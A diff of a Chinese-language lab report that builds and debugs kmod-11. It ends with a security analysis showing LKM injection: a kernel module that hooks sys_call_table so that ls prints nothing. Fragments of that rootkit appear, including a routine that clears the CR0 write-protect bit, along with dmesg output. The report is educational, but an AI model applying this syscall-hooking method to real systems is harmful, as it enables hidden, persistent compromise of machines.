+checking whether make supports nested variables... yes
+checking how to create a pax tar archive... gnutar
+checking for style of include used by make... GNU
+checking for gcc... gcc
+checking whether the C compiler works... yes
+checking for C compiler default output file name... a.out
+checking for suffix of executables... 
+checking whether we are cross compiling... no
+checking for suffix of object files... o
+checking whether we are using the GNU C compiler... yes
+checking whether gcc accepts -g... yes
+checking for gcc option to accept ISO C89... none needed
+checking dependency style of gcc... gcc3
+...
+kmod 11
+======
+
+prefix:         /usr
+sysconfdir:     /etc
+libdir:         /usr/lib
+rootlibdir:     /usr/lib
+includedir:     ${prefix}/include
+bindir:         ${exec_prefix}/bin
+
+compiler:       gcc -std=gnu99
+cflags:          -pipe -DANOTHER_BRICK_IN_THE -Wall -W -Wextra -Wno-inline -Wvla -Wundef -Wformat=2 -Wlogical-op -Wsign-compare -Wformat-security -Wmissing-include-dirs -Wformat-nonliteral -Wold-style-definition -Wpointer-arith -Winit-self -Wdeclaration-after-statement -Wfloat-equal -Wmissing-prototypes -Wstrict-prototypes -Wredundant-decls -Wmissing-declarations -Wmissing-noreturn -Wshadow -Wendif-labels -Wstrict-aliasing=2 -Wwrite-strings -Wno-long-long -Wno-overlength-strings -Wno-unused-parameter -Wno-missing-field-initializers -Wno-unused-result -Wnested-externs -Wchar-subscripts -Wtype-limits -Wuninitialized -fno-common -fdiagnostics-show-option -fvisibility=hidden -ffunction-sections -fdata-sections -g -O2
+ldflags:         -Wl,--as-needed -Wl,--gc-sections 
+
+tools:          yes
+logging:        yes
+compression:        xz=no  zlib=no
+debug:          no
+doc:            no
+man:            yes</code></pre>
+<p>[htbp] <img src="./pictures/1-3-configure.png" alt="image" /> configure配置源码包</p>
+<h3 id="编译项目源码">编译项目源码</h3>
+<pre><code>$ make
+make --no-print-directory all-recursive
+Making all in .
+  CC       libkmod/libkmod.lo
+  CC       libkmod/libkmod-list.lo
+  CC       libkmod/libkmod-config.lo
+  CC       libkmod/libkmod-index.lo
+  CC       libkmod/libkmod-module.lo
+  CC       libkmod/libkmod-file.lo
+  CC       libkmod/libkmod-elf.lo
+  CC       libkmod/libkmod-hash.lo
+  CC       libkmod/libkmod-array.lo
+  CC       libkmod/libkmod-util.lo
+  CCLD     libkmod/libkmod-util.la
+  CCLD     libkmod/libkmod.la
+  CCLD     libkmod/libkmod-private.la
+  CC       tools/kmod.o
+  CC       tools/lsmod.o
+  CC       tools/rmmod.o
+  CC       tools/insmod.o
+  CC       tools/modinfo.o
+  CC       tools/modprobe.o
+  CC       tools/depmod.o
+  CC       tools/log.o
+  CCLD     tools/kmod
+  CCLD     tools/kmod-nolib
+  GEN      tools/insmod
+  GEN      tools/rmmod
+  GEN      tools/lsmod
+  GEN      tools/modprobe
+  GEN      tools/modinfo
+  GEN      tools/depmod
+  GEN      libkmod/libkmod.pc
+Making all in libkmod/docs
+make[2]: Nothing to be done for `all&#39;.
+Making all in man
+make[2]: Nothing to be done for `all&#39;.</code></pre>
+<p>[htbp] <img src="./pictures/1-4-make.png" alt="image" /> make编译源码包</p>
+<h3 id="测试生成命令">测试生成命令</h3>
+<pre><code>$ ./tools/insmod -h
+Usage:
+    insmod [options] filename [args]
+Options:
+    -V, --version     show version
+    -h, --help        show this help
+$ ./tools/rmmod -h
+Usage:
+    rmmod [options] modulename ...
+Options:
+    -f, --force       forces a module unload and may crash your
+                  machine. This requires Forced Module Removal
+                  option in your kernel. DANGEROUS
+    -s, --syslog      print to syslog, not stderr
+    -v, --verbose     enables more messages
+    -V, --version     show version
+    -h, --help        show this help
+$ ./tools/lsmod -h
+Usage: ./tools/lsmod
+$ ./tools/modinfo -h
+Usage:
+    modinfo [options] filename [args]
+Options:
+    -a, --author                Print only &#39;author&#39;
+    -d, --description           Print only &#39;description&#39;
+    -l, --license               Print only &#39;license&#39;
+    -p, --parameters            Print only &#39;parm&#39;
+    -n, --filename              Print only &#39;filename&#39;
+    -0, --null                  Use \0 instead of \n
+    -F, --field=FIELD           Print only provided FIELD
+    -k, --set-version=VERSION   Use VERSION instead of `uname -r`
+    -b, --basedir=DIR           Use DIR as filesystem root for /lib/modules
+    -V, --version               Show version
+    -h, --help                  Show this help
+$ </code></pre>
+<p>[htbp] <img src="./pictures/1-5-test.png" alt="image" /> 测试生成命令</p>
+<h2 id="项目debug版运行调试图">项目Debug版运行调试图</h2>
+<h3 id="配置时加上-enable-debug-enable-logging-参数">配置时加上 –enable-debug, –enable-logging 参数</h3>
+<pre><code>$ ./configure CFLAGS=&quot;-g -O2&quot; --prefix=/usr --sysconfdir=/etc --libdir=/usr/lib --enable-debug --enable-logging
+checking for a BSD-compatible install... /usr/bin/install -c
+checking whether build environment is sane... yes
+checking for a thread-safe mkdir -p... /bin/mkdir -p
+checking for gawk... no
+checking for mawk... mawk
+checking whether make sets $(MAKE)... yes
+checking whether make supports nested variables... yes
+checking how to create a pax tar archive... gnutar
+checking for style of include used by make... GNU
+checking for gcc... gcc
+checking whether the C compiler works... yes
+checking for C compiler default output file name... a.out
+checking for suffix of executables... 
+checking whether we are cross compiling... no
+checking for suffix of object files... o
+checking whether we are using the GNU C compiler... yes
+checking whether gcc accepts -g... yes
+checking for gcc option to accept ISO C89... none needed
+checking dependency style of gcc... gcc3
+checking for gcc option to accept ISO C99... -std=gnu99
+checking for gcc -std=gnu99 option to accept ISO Standard C... (cached) -std=gnu99
+checking how to run the C preprocessor... gcc -std=gnu99 -E
+checking for grep that handles long lines and -e... /bin/grep
+checking for egrep... /bin/grep -E
+checking for ANSI C header files... yes
+checking for sys/types.h... yes
+checking for sys/stat.h... yes
+checking for stdlib.h... yes
+checking for string.h... yes
+checking for memory.h... yes
+checking for strings.h... yes
+checking for inttypes.h... yes
+checking for stdint.h... yes
+checking for unistd.h... yes
+checking minix/config.h usability... no
+checking minix/config.h presence... no
+checking for minix/config.h... no
+checking whether it is safe to define __EXTENSIONS__... yes
+checking for special C compiler options needed for large files... no
+checking for _FILE_OFFSET_BITS value needed for large files... 64
+checking whether make supports nested variables... (cached) yes
+checking build system type... i686-pc-linux-gnu
+checking host system type... i686-pc-linux-gnu
+checking how to print strings... printf
+checking for a sed that does not truncate output... /bin/sed
+checking for fgrep... /bin/grep -F
+checking for ld used by gcc -std=gnu99... /usr/bin/ld
+checking if the linker (/usr/bin/ld) is GNU ld... yes
+checking for BSD- or MS-compatible name lister (nm)... /usr/bin/nm -B
+checking the name lister (/usr/bin/nm -B) interface... BSD nm
+checking whether ln -s works... yes
+checking the maximum length of command line arguments... 1572864
+checking whether the shell understands some XSI constructs... yes
+checking whether the shell understands &quot;+=&quot;... yes
+checking how to convert i686-pc-linux-gnu file names to i686-pc-linux-gnu format... func_convert_file_noop
+checking how to convert i686-pc-linux-gnu file names to toolchain format... func_convert_file_noop
+checking for /usr/bin/ld option to reload object files... -r
+checking for objdump... objdump
+checking how to recognize dependent libraries... pass_all
+checking for dlltool... no
+checking how to associate runtime and link libraries... printf %s\n
+checking for ar... ar
+checking for archiver @FILE support... @
+checking for strip... strip
+checking for ranlib... ranlib
+checking command to parse /usr/bin/nm -B output from gcc -std=gnu99 object... ok
+checking for sysroot... no
+checking for mt... mt
+checking if mt is a manifest tool... no
+checking for dlfcn.h... yes
+checking for objdir... .libs
+checking if gcc -std=gnu99 supports -fno-rtti -fno-exceptions... no
+checking for gcc -std=gnu99 option to produce PIC... -fPIC -DPIC
+checking if gcc -std=gnu99 PIC flag -fPIC -DPIC works... yes
+checking if gcc -std=gnu99 static flag -static works... yes
+checking if gcc -std=gnu99 supports -c -o file.o... yes
+checking if gcc -std=gnu99 supports -c -o file.o... (cached) yes
+checking whether the gcc -std=gnu99 linker (/usr/bin/ld) supports shared libraries... yes
+checking whether -lc should be explicitly linked in... no
+checking dynamic linker characteristics... GNU/Linux ld.so
+checking how to hardcode library paths into programs... immediate
+checking whether stripping libraries is possible... yes
+checking if libtool supports shared libraries... yes
+checking whether to build shared libraries... yes
+checking whether to build static libraries... no
+checking for gcc... (cached) gcc
+checking whether we are using the GNU C compiler... (cached) yes
+checking whether gcc accepts -g... (cached) yes
+checking for gcc option to accept ISO C89... (cached) none needed
+checking dependency style of gcc... (cached) gcc3
+checking for gcc option to accept ISO C99... (cached) -std=gnu99
+checking for typeof syntax and keyword spelling... typeof
+checking whether gcc -std=gnu99 and cc understand -c and -o together... yes
+checking whether gcc -std=gnu99 needs -traditional... no
+checking whether byte ordering is bigendian... no
+checking for a sed that does not truncate output... (cached) /bin/sed
+checking for pkg-config... /usr/bin/pkg-config
+checking pkg-config is at least version 0.9.0... yes
+checking for __xstat... yes
+checking for struct stat.st_mtim... yes
+configure: Xz support not requested
+configure: zlib support not requested
+checking for xsltproc... /usr/bin/xsltproc
+checking for gtkdoc-check... no
+checking for gtkdoc-rebase... no
+checking for gtkdoc-mkpdf... no
+checking whether to build gtk-doc documentation... no
+checking if gcc -std=gnu99 supports flag -pipe in envvar CFLAGS... yes
+checking if gcc -std=gnu99 supports flag -DANOTHER_BRICK_IN_THE in envvar CFLAGS... yes
+checking if gcc -std=gnu99 supports flag -Wall in envvar CFLAGS... yes
+checking if gcc -std=gnu99 supports flag -W in envvar CFLAGS... yes
+checking if gcc -std=gnu99 supports flag -Wextra in envvar CFLAGS... yes
+checking if gcc -std=gnu99 supports flag -Wno-inline in envvar CFLAGS... yes
+checking if gcc -std=gnu99 supports flag -Wvla in envvar CFLAGS... yes
+checking if gcc -std=gnu99 supports flag -Wundef in envvar CFLAGS... yes
+checking if gcc -std=gnu99 supports flag -Wformat=2 in envvar CFLAGS... yes
+checking if gcc -std=gnu99 supports flag -Wlogical-op in envvar CFLAGS... yes
+checking if gcc -std=gnu99 supports flag -Wsign-compare in envvar CFLAGS... yes
+checking if gcc -std=gnu99 supports flag -Wformat-security in envvar CFLAGS... yes
+checking if gcc -std=gnu99 supports flag -Wmissing-include-dirs in envvar CFLAGS... yes
+checking if gcc -std=gnu99 supports flag -Wformat-nonliteral in envvar CFLAGS... yes
+checking if gcc -std=gnu99 supports flag -Wold-style-definition in envvar CFLAGS... yes
+checking if gcc -std=gnu99 supports flag -Wpointer-arith in envvar CFLAGS... yes
+checking if gcc -std=gnu99 supports flag -Winit-self in envvar CFLAGS... yes
+checking if gcc -std=gnu99 supports flag -Wdeclaration-after-statement in envvar CFLAGS... yes
+checking if gcc -std=gnu99 supports flag -Wfloat-equal in envvar CFLAGS... yes
+checking if gcc -std=gnu99 supports flag -Wmissing-prototypes in envvar CFLAGS... yes
+checking if gcc -std=gnu99 supports flag -Wstrict-prototypes in envvar CFLAGS... yes
+checking if gcc -std=gnu99 supports flag -Wredundant-decls in envvar CFLAGS... yes
+checking if gcc -std=gnu99 supports flag -Wmissing-declarations in envvar CFLAGS... yes
+checking if gcc -std=gnu99 supports flag -Wmissing-noreturn in envvar CFLAGS... yes
+checking if gcc -std=gnu99 supports flag -Wshadow in envvar CFLAGS... yes
+checking if gcc -std=gnu99 supports flag -Wendif-labels in envvar CFLAGS... yes
+checking if gcc -std=gnu99 supports flag -Wstrict-aliasing=2 in envvar CFLAGS... yes
+checking if gcc -std=gnu99 supports flag -Wwrite-strings in envvar CFLAGS... yes
+checking if gcc -std=gnu99 supports flag -Wno-long-long in envvar CFLAGS... yes
+checking if gcc -std=gnu99 supports flag -Wno-overlength-strings in envvar CFLAGS... yes
+checking if gcc -std=gnu99 supports flag -Wno-unused-parameter in envvar CFLAGS... yes
+checking if gcc -std=gnu99 supports flag -Wno-missing-field-initializers in envvar CFLAGS... yes
+checking if gcc -std=gnu99 supports flag -Wno-unused-result in envvar CFLAGS... yes
+checking if gcc -std=gnu99 supports flag -Wnested-externs in envvar CFLAGS... yes
+checking if gcc -std=gnu99 supports flag -Wchar-subscripts in envvar CFLAGS... yes
+checking if gcc -std=gnu99 supports flag -Wtype-limits in envvar CFLAGS... yes
+checking if gcc -std=gnu99 supports flag -Wuninitialized in envvar CFLAGS... yes
+checking if gcc -std=gnu99 supports flag -fno-common in envvar CFLAGS... yes
+checking if gcc -std=gnu99 supports flag -fdiagnostics-show-option in envvar CFLAGS... yes
+checking if gcc -std=gnu99 supports flag -fvisibility=hidden in envvar CFLAGS... yes
+checking if gcc -std=gnu99 supports flag -ffunction-sections in envvar CFLAGS... yes
+checking if gcc -std=gnu99 supports flag -fdata-sections in envvar CFLAGS... yes
+checking if gcc -std=gnu99 supports flag -Wl,--as-needed in envvar LDFLAGS... yes
+checking if gcc -std=gnu99 supports flag -Wl,--gc-sections in envvar LDFLAGS... yes
+checking that generated files are newer than configure... done
+configure: creating ./config.status
+config.status: creating Makefile
+config.status: creating man/Makefile
+config.status: creating libkmod/docs/Makefile
+config.status: creating libkmod/docs/version.xml
+config.status: creating config.h
+config.status: executing depfiles commands
+
+config.status: executing libtool commands
+
+    kmod 11
+    ======
+
+    prefix:         /usr
+    sysconfdir:     /etc
+    libdir:         /usr/lib
+    rootlibdir:     /usr/lib
+    includedir:     ${prefix}/include
+    bindir:         ${exec_prefix}/bin
+
+    compiler:       gcc -std=gnu99
+    cflags:          -pipe -DANOTHER_BRICK_IN_THE -Wall -W -Wextra -Wno-inline -Wvla -Wundef -Wformat=2 -Wlogical-op -Wsign-compare -Wformat-security -Wmissing-include-dirs -Wformat-nonliteral -Wold-style-definition -Wpointer-arith -Winit-self -Wdeclaration-after-statement -Wfloat-equal -Wmissing-prototypes -Wstrict-prototypes -Wredundant-decls -Wmissing-declarations -Wmissing-noreturn -Wshadow -Wendif-labels -Wstrict-aliasing=2 -Wwrite-strings -Wno-long-long -Wno-overlength-strings -Wno-unused-parameter -Wno-missing-field-initializers -Wno-unused-result -Wnested-externs -Wchar-subscripts -Wtype-limits -Wuninitialized -fno-common -fdiagnostics-show-option -fvisibility=hidden -ffunction-sections -fdata-sections -g -O2
+    ldflags:         -Wl,--as-needed -Wl,--gc-sections 
+
+    tools:          yes
+    logging:        yes
+    compression:        xz=no  zlib=no
+    debug:          yes
+    doc:            no
+    man:            yes</code></pre>
+<p>[htbp] <img src="./pictures/2-1-configure.png" alt="image" /> 配置时加上调试参数</p>
+<h3 id="make-clean-make-重新编译">make clean &amp;&amp; make 重新编译</h3>
+<pre><code>$ make clean &amp;&amp; make
+Making clean in .
+ rm -f tools/kmod
+test -z &quot;testsuite/uname.la testsuite/path.la testsuite/init_module.la testsuite/delete_module.la testsuite/libtestsuite.la&quot; || rm -f testsuite/uname.la testsuite/path.la testsuite/init_module.la testsuite/delete_module.la testsuite/libtestsuite.la
+rm -f testsuite/so_locations
+ rm -f testsuite/test-init testsuite/test-testsuite testsuite/test-loaded testsuite/test-modinfo testsuite/test-alias testsuite/test-new-module testsuite/test-modprobe testsuite/test-blacklist testsuite/test-dependencies testsuite/test-depmod
+test -z &quot;libkmod/libkmod.pc&quot; || rm -f libkmod/libkmod.pc
+test -z &quot;libkmod/libkmod.la&quot; || rm -f libkmod/libkmod.la
+rm -f libkmod/so_locations
+rm -rf .libs _libs
+rm -rf libkmod/.libs libkmod/_libs
+rm -rf testsuite/.libs testsuite/_libs
+rm -rf tools/.libs tools/_libs
+test -z &quot;libkmod/libkmod-util.la libkmod/libkmod-private.la&quot; || rm -f libkmod/libkmod-util.la libkmod/libkmod-private.la
+rm -f libkmod/so_locations
+ rm -f tools/kmod-nolib
+rm -f *.o
+rm -f libkmod/*.o
+rm -f libkmod/*.lo
+rm -f testsuite/*.o
+rm -f testsuite/*.lo
+rm -f tools/*.o
+rm -f *.lo
+Making clean in libkmod/docs
+test -z &quot;&quot; || rm -f 
+rm -rf .libs _libs
+rm -f *.lo
+Making clean in man
+test -z &quot;depmod.d.5 modprobe.d.5 modules.dep.5 depmod.8 insmod.8 lsmod.8 rmmod.8 modprobe.8 modinfo.8 modules.dep.bin.5&quot; || rm -f depmod.d.5 modprobe.d.5 modules.dep.5 depmod.8 insmod.8 lsmod.8 rmmod.8 modprobe.8 modinfo.8 modules.dep.bin.5
+rm -rf .libs _libs
+rm -f *.lo
+make --no-print-directory all-recursive
+Making all in .
+  CC       libkmod/libkmod.lo
+  CC       libkmod/libkmod-list.lo
+  CC       libkmod/libkmod-config.lo
+  CC       libkmod/libkmod-index.lo
+  CC       libkmod/libkmod-module.lo
+  CC       libkmod/libkmod-file.lo
+  CC       libkmod/libkmod-elf.lo
+  CC       libkmod/libkmod-hash.lo
+  CC       libkmod/libkmod-array.lo
+  CC       libkmod/libkmod-util.lo
+  CCLD     libkmod/libkmod-util.la
+  CCLD     libkmod/libkmod.la
+  CCLD     libkmod/libkmod-private.la
+  CC       tools/kmod.o
+  CC       tools/lsmod.o
+  CC       tools/rmmod.o
+  CC       tools/insmod.o
+  CC       tools/modinfo.o
+  CC       tools/modprobe.o
+  CC       tools/depmod.o
+  CC       tools/log.o
+  CCLD     tools/kmod
+  CCLD     tools/kmod-nolib
+  GEN      libkmod/libkmod.pc
+Making all in libkmod/docs
+make[2]: Nothing to be done for `all&#39;.
+Making all in man
+  GEN      depmod.d.5
+  GEN      modprobe.d.5
+  GEN      modules.dep.5
+  GEN      depmod.8
+  GEN      insmod.8
+  GEN      lsmod.8
+  GEN      rmmod.8
+  GEN      modprobe.8
+  GEN      modinfo.8
+$ </code></pre>
+<p>[htbp] <img src="./pictures/2-2-make.png" alt="image" /> make重新编译</p>
+<h3 id="设置日志优先级-kmod_log7">设置日志优先级 KMOD_LOG=7</h3>
+<pre><code>$ sudo KMOD_LOG=7 ./tools/insmod ../hello-module/hello.ko
+libkmod: INFO libkmod/libkmod.c:275 kmod_new: ctx 0x9243008 created
+libkmod: DEBUG libkmod/libkmod.c:276 kmod_new: log_priority=7
+libkmod: DEBUG libkmod/libkmod.c:389 kmod_pool_get_module: get module name=&#39;hello&#39; found=(nil)
+libkmod: DEBUG libkmod/libkmod.c:389 kmod_pool_get_module: get module name=&#39;hello&#39; found=(nil)
+libkmod: DEBUG libkmod/libkmod.c:397 kmod_pool_add_module: add 0x9243088 key=&#39;hello&#39;
+libkmod: DEBUG libkmod/libkmod-module.c:718 kmod_module_get_path: name=&#39;hello&#39; path=&#39;/home/akaedu/Github/test-kmod-11/kmod-11/../hello-module/hello.ko&#39;
+libkmod: DEBUG libkmod/libkmod-module.c:440 kmod_module_unref: kmod_module 0x9243088 released
+libkmod: DEBUG libkmod/libkmod.c:405 kmod_pool_del_module: del 0x9243088 key=&#39;hello&#39;
+libkmod: INFO libkmod/libkmod.c:318 kmod_unref: context 0x9243008 released
+$ </code></pre>
+<p>[htbp] <img src="./pictures/2-3-insmod.png" alt="image" /> 设置 KMOD_LOG=7 模式下插入模块</p>
+<h3 id="卸载模块以便进行下一次插入">卸载模块以便进行下一次插入</h3>
+<pre><code>$ sudo KMOD_LOG=7 ./tools/rmmod ../hello-module/hello.ko
+libkmod: INFO libkmod/libkmod.c:275 kmod_new: ctx 0x9584008 created
+libkmod: DEBUG libkmod/libkmod.c:276 kmod_new: log_priority=7
+$ </code></pre>
+<h3 id="设置日志优先级-kmod_log6">设置日志优先级 KMOD_LOG=6</h3>
+<pre><code>$ sudo KMOD_LOG=6 ./tools/insmod ../hello-module/hello.ko
+libkmod: INFO libkmod/libkmod.c:275 kmod_new: ctx 0x9c46008 created
+libkmod: INFO libkmod/libkmod.c:318 kmod_unref: context 0x9c46008 released
+$ 
+
+$ sudo KMOD_LOG=6 ./tools/rmmod ../hello-module/hello.ko
+libkmod: INFO libkmod/libkmod.c:275 kmod_new: ctx 0x9584008 created
+libkmod: DEBUG libkmod/libkmod.c:276 kmod_new: log_priority=7
+$ </code></pre>
+<p>[htbp] <img src="./pictures/2-4-insmod2.png" alt="image" /> 设置 KMOD_LOG=6 模式下插入模块</p>
+<h2 id="源码修改运行调试图">源码修改运行调试图</h2>
+<h3 id="修改-modprobe.c-源码">修改 modprobe.c 源码</h3>
+<h3 id="修改-kmod_module_parse_depline-函数">修改 kmod_module_parse_depline 函数</h3>
+<pre><code>$ vi kmod-11/libkmod/libkmod-module.c +120
+120 int kmod_module_parse_depline(struct kmod_module *mod, char *line)
+121 {
+122         struct kmod_ctx *ctx = mod-&gt;ctx;
+123         struct kmod_list *list = NULL;
+124         const char *dirname;
+125         char buf[PATH_MAX];
+126         char *p, *saveptr;
+127         int err = 0, n = 0;
+128         size_t dirnamelen;
+129 
+130         printf(&quot;&lt;mydebug&gt; line = %s\n&quot;, line);
+131 
+132         if (mod-&gt;init.dep)
+133                 return mod-&gt;n_dep;
+134         assert(mod-&gt;dep == NULL);
+135         mod-&gt;init.dep = true;
+136 
+137         p = strchr(line, &#39;:&#39;);
+138         if (p == NULL)
+139                 return 0;
+140 </code></pre>
+<p>[htbp] <img src="./pictures/3-1-depline.png" alt="image" /> 插入130行的打印 line 的语句</p>
+<h3 id="重新编译生成新的-modprobe">重新编译生成新的 modprobe</h3>
+<pre><code>$ make -C kmod-11/
+make: Entering directory `/home/akaedu/Github/test-kmod-11/kmod-11&#39;
+make --no-print-directory all-recursive
+Making all in .
+  CC       libkmod/libkmod-module.lo
+  CCLD     libkmod/libkmod.la
+  CCLD     libkmod/libkmod-private.la
+  CCLD     tools/kmod
+  CCLD     tools/kmod-nolib
+Making all in libkmod/docs
+make[2]: Nothing to be done for `all&#39;.
+Making all in man
+make[2]: Nothing to be done for `all&#39;.
+make: Leaving directory `/home/akaedu/Github/test-kmod-11/kmod-11&#39;
+$ </code></pre>
+<p>[htbp] <img src="./pictures/3-2-make.png" alt="image" /> make编译成功，增量编译了libkmod-module模块</p>
+<h3 id="运行-modprobe-nfs">运行 modprobe nfs</h3>
+<pre><code>$ ./kmod-11/tools/modprobe nfs
+&lt;mydebug&gt; line = kernel/fs/nfs/nfs.ko: kernel/fs/nfs_common/nfs_acl.ko kernel/net/sunrpc/auth_gss/auth_rpcgss.ko kernel/fs/fscache/fscache.ko kernel/fs/lockd/lockd.ko kernel/net/sunrpc/sunrpc.ko
+
+$ lsmod | grep nfs
+nfsd                  229850  13 
+nfs                   307376  0 
+nfs_acl                12771  2 nfsd,nfs
+auth_rpcgss            39597  2 nfsd,nfs
+fscache                50642  1 nfs
+lockd                  78804  2 nfsd,nfs
+sunrpc                205647  19 nfsd,nfs,nfs_acl,auth_rpcgss,lockd
+$ </code></pre>
+<p>[htbp] <img src="./pictures/3-3-modprobe.png" alt="image" /> 运行 modprobe nfs 完成插入</p>
+<h3 id="插入167行打印语句">插入167行打印语句</h3>
+<pre><code>$ vi kmod-11/libkmod/libkmod-module.c +161
+161         p++;
+162         for (p = strtok_r(p, &quot; \t&quot;, &amp;saveptr); p != NULL;
+163                                         p = strtok_r(NULL, &quot; \t&quot;, &amp;saveptr)     ) {
+164                 struct kmod_module *depmod;
+165                 const char *path;
+166 
+167                 printf(&quot;&lt;mydebug&gt; p = %s\n&quot;, p);
+168                 path = path_join(p, dirnamelen, buf);
+169                 if (path == NULL) {
+170                         ERR(ctx, &quot;could not join path &#39;%s&#39; and &#39;%s&#39;.\n&quot;,
+171                             dirname, p);
+172                         goto fail;
+173                 }</code></pre>
+<p>[htbp] <img src="./pictures/3-4-print-p.png" alt="image" /> 插入打印每个模块名称的调试代码</p>
+<h3 id="重新编译生成新的-modprobe-1">重新编译生成新的 modprobe</h3>
+<pre><code>$ make -C kmod-11/
+make: Entering directory `/home/akaedu/Github/test-kmod-11/kmod-11&#39;
+make --no-print-directory all-recursive
+Making all in .
+  CC       libkmod/libkmod-module.lo
+  CCLD     libkmod/libkmod.la
+  CCLD     libkmod/libkmod-private.la
+  CCLD     tools/kmod
+  CCLD     tools/kmod-nolib
+Making all in libkmod/docs
+make[2]: Nothing to be done for `all&#39;.
+Making all in man
+make[2]: Nothing to be done for `all&#39;.
+make: Leaving directory `/home/akaedu/Github/test-kmod-11/kmod-11&#39;
+$ </code></pre>
+<h3 id="运行-modprobe-nfs-1">运行 modprobe nfs</h3>
+<pre><code>$ ./kmod-11/tools/modprobe nfs
+&lt;mydebug&gt; line = kernel/fs/nfs/nfs.ko: kernel/fs/nfs_common/nfs_acl.ko kernel/net/sunrpc/auth_gss/auth_rpcgss.ko kernel/fs/fscache/fscache.ko kernel/fs/lockd/lockd.ko kernel/net/sunrpc/sunrpc.ko
+&lt;mydebug&gt; p = kernel/fs/nfs_common/nfs_acl.ko
+&lt;mydebug&gt; p = kernel/net/sunrpc/auth_gss/auth_rpcgss.ko
+&lt;mydebug&gt; p = kernel/fs/fscache/fscache.ko
+&lt;mydebug&gt; p = kernel/fs/lockd/lockd.ko
+&lt;mydebug&gt; p = kernel/net/sunrpc/sunrpc.ko</code></pre>
+<p>[htbp] <img src="./pictures/3-5-print-p-output.png" alt="image" /> 调试代码输出详细调试信息</p>
 <h1 id="kmod-11-项目安全漏洞分析报告">Kmod-11 项目安全漏洞分析报告</h1>
 <p>Kmod 项目本身是为了给用户空间提供一套可以对内核模块进行编程的接口，同时顺便用这套接口实现了原来 module-init-tools 的命令集合，用以验证这套库的正确性。 这个项目本身的安全漏洞并不是黑客攻击的主要方向和手段，而是基于内核模块加载之后，利用内核模块在系统空间运行这一特性， 能够访问Linux 的系统资源，例如修改系统调用表 sys_call_table，可以影响内核的行为从而达到进行攻击并留下安全漏洞的目的，这种攻击手法称为LKM注入。</p>
 <p>LKM是 Linux Kernel Moudle 的简称，LKM 注入的一般做法都是通过编写一个特定的内核模块，将这个模块通过 sudo insmod 加载进入内核， 这个被加载的内核模块，通常是修改系统调用，或者是添加系统调用，从而使得在用户空间的行为将可能存在安全漏洞。</p>
 <p>由于这种手法是通过修改内核空间的代码和数据来实现的，并不影响用户空间的程序，因此无法通过一般的对比文件差异的方法被识别出来，具有很强的隐蔽性。</p>
-<p>以下我们通过3个例子，来说明这种安全漏洞如何实现和解决。</p>
-<h2 id="安全漏洞案例1-ls命令">安全漏洞案例1 ls命令</h2>
-<p>我们经常使用的用户空间的命令，大部分都是通过系统调用来完成的。例如 ls 显示目录内容的命令，我们可以通过 strace 来跟踪程序使用了何种系统调用。</p>
+<p>以下我们通过2个例子，来说明这种安全漏洞如何实现和解决。</p>
+<h2 id="安全漏洞案例1-ls命令">安全漏洞案例1-ls命令</h2>
+<p>我们经常使用的用户空间的命令，大部分都是通过系统调用来完成的。例如 ls 显示目录内容的命令，我们可以通过 strace 来跟踪程序使用了何种系统调用，通过修改系统调用表中对应的函数入口地址，可以截获 ls 命令的执行，例如让它什么都不显示，直接返回，这样就可以达到隐藏某些特殊文件的目的。</p>
 <h3 id="strace-跟踪-ls-命令的系统调用">strace 跟踪 ls 命令的系统调用</h3>
 <pre><code>$ strace ls
 execve(&quot;/bin/ls&quot;, [&quot;ls&quot;], [/* 35 vars */]) = 0
@@ -2763,14 +3313,10 @@ getdents64(3, /* 0 entries */, 32768)   = 0
 close(3)                                = 0
 fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 3), ...}) = 0
 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7762000
-write(1, &quot;aclocal.m4   config.log     COPY&quot;..., 67aclocal.m4   config.log     COPYING  Makefile   NEWS      testsuite
-) = 67
-write(1, &quot;build-aux    config.status  libk&quot;..., 65build-aux    config.status  libkmod  Makefile.am  README    TODO
-) = 65
-write(1, &quot;config.h     configure\t    libto&quot;..., 65config.h     configure       libtool  Makefile.in  stamp-h1  tools
-) = 65
-write(1, &quot;config.h.in  configure.ac   m4\t &quot;..., 47config.h.in  configure.ac   m4        man      tags
-) = 47
+write(1, &quot;aclocal.m4   config.log     COPY&quot;..., 67aclocal.m4   config.log     COPYING  Makefile   NEWS      testsuite) = 67
+write(1, &quot;build-aux    config.status  libk&quot;..., 65build-aux    config.status  libkmod  Makefile.am  README    TODO) = 65
+write(1, &quot;config.h     configure\t    libto&quot;..., 65config.h     configure       libtool  Makefile.in  stamp-h1  tools) = 65
+write(1, &quot;config.h.in  configure.ac   m4\t &quot;..., 47config.h.in  configure.ac   m4        man      tags) = 47
 close(1)                                = 0
 munmap(0xb7762000, 4096)                = 0
 close(2)                                = 0
@@ -2827,7 +3373,7 @@ unsigned int clear_and_return_cr0(void)
 
     asm volatile(&quot;movl %%cr0,%%eax&quot;
             :&quot;=a&quot;(cr0)
-            );                                    //存储cr0的值
+            );      //存储cr0的值
     ret = cr0;
 
     /*将cr0的第16位清零，第16为0表示允许超级权限*/
@@ -2916,13 +3462,13 @@ $ dmesg </code></pre>
 $ dmesg 
 [ 5943.659744] init ok, SYSCALL NUM = 220
 [ 5943.659749] table at c15b0000</code></pre>
-<h3 id="此时-ls-命令没有输出">此时 ls 命令没有输出</h3>
+<h3 id="模块加载后运行-ls-命令没有输出">模块加载后运行 ls 命令没有输出</h3>
 <pre><code>$ ls
 $ dmesg 
 [ 5943.659744] init ok, SYSCALL NUM = 220
 [ 5943.659749] table at c15b0000
 [ 5949.890430] haha, your command is hacked!</code></pre>
-<p>每运行一次 ls ，则我们注册的 hack_cmd 函数就会被调用一次。</p>
+<p>查看内核打印信息中，已经能够看到 hack_cmd 函数被调用过，有输出信息。 每运行一次 ls ，则我们注册的 hack_cmd 函数就会被调用一次。</p>
 <pre><code>$ ls
 $ dmesg 
 [ 5943.659744] init ok, SYSCALL NUM = 220
@@ -2941,7 +3487,7 @@ all:
 
 clean:
     rm -rf *.o *.ko *.mod.* *.cmd </code></pre>
-<h3 id="卸载模块后-ls-输出恢复正常">卸载模块后 ls 输出恢复正常</h3>
+<h3 id="卸载模块后运行-ls-输出恢复正常">卸载模块后运行 ls 输出恢复正常</h3>
 <pre><code>$ sudo rmmod hackls.ko
 $ dmesg 
 [ 5943.659744] init ok, SYSCALL NUM = 220
@@ -2953,38 +3499,177 @@ $ ls
 hackls.ko     hackls.mod.o  Makefile       Module.symvers
 hackls.c  hackls.mod.c  hackls.o      modules.order
 $ </code></pre>
